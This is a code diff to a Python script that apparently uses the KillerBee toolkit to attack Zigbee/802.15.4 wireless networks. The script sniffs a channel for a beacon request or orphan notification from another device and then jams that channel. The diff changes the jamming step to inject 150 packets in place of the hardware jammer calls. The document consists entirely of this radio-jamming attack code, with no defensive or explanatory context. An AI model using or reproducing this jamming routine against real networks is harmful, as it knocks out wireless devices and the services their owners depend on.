@@ -80,7 +80,7 @@ if __name__ == '__main__':
         print('3. Listening for a beacon request or orphan notification from another device...')
         got_beacon_request = False
         counter = 1
-        kb.sniffer_on()
+        kb.sniffer_on(args.channel)
         while not got_beacon_request:
             packet = kb.pnext()
             if packet:
@@ -96,12 +96,12 @@ if __name__ == '__main__':
                     counter += 1
         kb.sniffer_off()
 
-        # Jam for 0.4 sec
         print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
-        #kb.inject(JAM_PKT_BYTES, args.channel, count=150, delay=0)
-        kb.jammer_on()
-        time.sleep(JAM_TIME_SEC)
-        kb.jammer_off()
+        kb.inject(JAM_PKT_BYTES, None, count=150, delay=0)
+
+        #kb.jammer_on()
+        #time.sleep(JAM_TIME_SEC)
+        #kb.jammer_off()
 
         # Increment channel
         # TODO: Are channel scans incremental from 11 to 26?
